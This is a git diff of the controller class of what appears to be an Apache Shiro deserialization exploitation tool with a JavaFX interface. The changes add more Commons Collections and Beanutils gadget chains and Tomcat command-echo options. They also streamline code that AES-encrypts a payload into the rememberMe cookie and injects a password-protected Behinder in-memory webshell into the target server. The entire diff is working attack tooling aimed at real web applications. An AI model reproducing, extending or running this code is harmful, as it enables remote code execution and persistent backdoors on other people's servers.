@@ -5,7 +5,7 @@ import cn.safe6.core.ControllersFactory;
 import cn.safe6.core.http.Request;
 import cn.safe6.core.http.Response;
 import cn.safe6.core.jobs.BurstJob;
-import cn.safe6.payload.memshell.Loader1;
+import cn.safe6.payload.memshell.Loader;
 import cn.safe6.util.*;
 import javafx.application.Platform;
 import javafx.collections.FXCollections;
@@ -56,7 +56,7 @@ public class Controller {
     public ChoiceBox gadget;
 
     @FXML
-    public ChoiceBox serverType;
+    public ChoiceBox echoType;
 
     @FXML
     public TextField cmd;
@@ -91,6 +91,7 @@ public class Controller {
     public ChoiceBox shellType;
     @FXML
     public TextField path;
+
 
 
     ExecutorService pool = Executors.newFixedThreadPool(8);
@@ -151,9 +152,11 @@ public class Controller {
         checkType.setValue("SimplePrincipalCollection");
         checkType.setItems(checkTypeData);
 
-        ObservableList<String> serverTypeData = FXCollections.observableArrayList("Tomcat");
-        serverType.setValue("Tomcat");
-        serverType.setItems(serverTypeData);
+        ObservableList<String> echoTypeData = FXCollections.observableArrayList();
+        echoTypeData.add("TomcatEcho");
+        echoTypeData.add("TomcatEcho1");
+        echoType.setValue("TomcatEcho");
+        echoType.setItems(echoTypeData);
 
         ObservableList<String> shellTypeData = FXCollections.observableArrayList("BehinderFilter");
         shellType.setValue("BehinderFilter");
@@ -161,18 +164,20 @@ public class Controller {
 
         ObservableList<String> gadgetData = FXCollections.observableArrayList();
         gadgetData.add("CommonsBeanutils1");
-        gadgetData.add("CommonsBeanutils1b");
-        gadgetData.add("CommonsCollections11");
+        gadgetData.add("CommonsBeanutils183NOCC");
+        gadgetData.add("CommonsBeanutils192NOCC");
+        gadgetData.add("CommonsCollections2");
+        gadgetData.add("CommonsCollections3");
+        gadgetData.add("CommonsCollections4");
         gadgetData.add("CommonsCollectionsK1");
         gadgetData.add("CommonsCollectionsK2");
-        gadget.setValue("CommonsCollectionsK1");
+        gadget.setValue("CommonsBeanutils183NOCC");
         gadget.setItems(gadgetData);
 
     }
 
     @FXML
     public void check() {
-        // TODO: 2022/6/25 从爆破密钥copy过来的垃圾重复代码，不想抽离，不想优化。能用就行
         try {
             Platform.runLater(() -> checkButton.setDisable(true));
             this.validAllDataAndSetConfig();
@@ -272,20 +277,21 @@ public class Controller {
             }
             paramsContext.put("oldKey", aesKey.getText());
 
-            String expName = gadget.getValue().toString();
+            String gadgetName = gadget.getValue().toString();
             paramsContext.put("exp", gadget.getValue().toString());
-            //String echo = serverType.getValue().toString();
-            String echo = "TomcatEcho";
+            String echo = echoType.getValue().toString();
             String url = paramsContext.get("url").toString();
             String method = paramsContext.get("method").toString();
             String rmeValue = paramsContext.get("rmeValue").toString();
             Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
 
-            Class clazz = Class.forName(Constants.PAYLOAD_PACK + expName);
+            //利用链
+            Class clazz = Class.forName(Constants.PAYLOAD_PACK + gadgetName);
+            //rce回显
             Class clazz1 = Class.forName(Constants.PAYLOAD_PACK + echo);
-            Method mtd = clazz.getMethod("getPayload", byte[].class);
+            Method getPayloadMethod = clazz.getMethod("getPayload", byte[].class);
 
-            byte[] payload = (byte[]) mtd.invoke(null, clazz1.getMethod("getPayload").invoke(clazz1));
+            byte[] payload = (byte[]) getPayloadMethod.invoke(null, clazz1.getMethod("getPayload").invoke(clazz1));
 
             //System.out.println("payloadLen:"+payload.length);
 
@@ -315,10 +321,10 @@ public class Controller {
             }
             if (data != null) {
                 if (data.contains("$$")) {
+                    log.setText("");
                     logUtil.printData(data.replace("$", ""));
                 } else {
-                    logUtil.printWarningLog("未获取到回显!", true);
-                    //logUtil.printData(data);
+                    logUtil.printWarningLog("未获取到回显! 可尝试更换回显或利用链", true);
                 }
             }
 
@@ -357,32 +363,20 @@ public class Controller {
                 return;
             }
 
-            String expName = gadget.getValue().toString();
+            String gadgetName = gadget.getValue().toString();
             String shell = shellType.getValue().toString();
             String url = paramsContext.get("url").toString();
             String method = paramsContext.get("method").toString();
             String rmeValue = paramsContext.get("rmeValue").toString();
             Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
 
-
-
-            //获取class的base64
-            //String loaderData = GetByteCodeUtil.getEncodeData(BehinderLoader.class);
-            //String loaderData = paramsContext.get("BehinderLoader").toString();
-            //String loaderData = Loader.getPayload();
-            //System.out.println(loaderData);
-            //System.out.println("loaderData:"+loaderData.length());
-           //byte[] behinderLoaderBytes = Base64.getDecoder().decode(loaderData);
-            //byte[] behinderLoaderBytes = Loader.getPayload();
-            byte[] behinderLoaderBytes = Loader1.getPayload();
-
-
-
-            //塞进cc链
-            Class clazz = Class.forName(Constants.PAYLOAD_PACK + expName);
+            byte[] behinderLoaderBytes = Loader.getPayload();
+            //把待执行的类，塞进cc链
+            Class clazz = Class.forName(Constants.PAYLOAD_PACK + gadgetName);
             Method mtd = clazz.getMethod("getPayload", byte[].class);
             byte[] payload = (byte[]) mtd.invoke(null, behinderLoaderBytes);
 
+            //获取一个可用的header
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
 
             String encryptData;
@@ -392,28 +386,16 @@ public class Controller {
                 encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
             }
 
-            System.out.println("encryptData:"+encryptData.length());
-
-         /*   if (method.equals(Constants.METHOD_GET)) {
-                header.put("Content-Type","application/x-www-form-urlencoded");
-            }*/
-
             //解决长度问题，把大payload放post包提交
-            String postData="";
-            if (params == null) {
-                Class clazz1 = Class.forName(Constants.SHELL_PACK + shell);
-                Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class,String.class);
-                params = new HashMap<>();
-                //冰蝎内存马需要用到pageContext
-                //params.put("c1", GetByteCodeUtil.getEncodeData(PageContext.class));
-                //反射设置密码，取shell
-                String shellData = Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd,path1));
-                //System.out.println(shellData);
-                params.put("c1",shellData );
-                //postData = "c1="+paramsContext.get("PageContext")+"&c2="+shellData;
-            }
-
-
+            Class clazz1 = Class.forName(Constants.SHELL_PACK + shell);
+            Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class,String.class);
+            params = new HashMap<>();
+            //冰蝎内存马需要用到pageContext
+            //params.put("c1", GetByteCodeUtil.getEncodeData(PageContext.class));
+            //反射设置密码，取shell
+            String shellData = Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd,path1));
+            //System.out.println(shellData);
+            params.put("fuck",shellData);
             //请求包header超过8k会报header too large错误
             //此处大坑，有时候需要urlencode
             header.put("cookie", rmeValue + "=" + encryptData);
@@ -443,7 +425,6 @@ public class Controller {
                 //logUtil.printData(data);
                 logUtil.printData(ss);
             }
-
         } catch (Exception e) {
             e.printStackTrace();
             logUtil.printAbortedLog("内存马注入失败！",true);
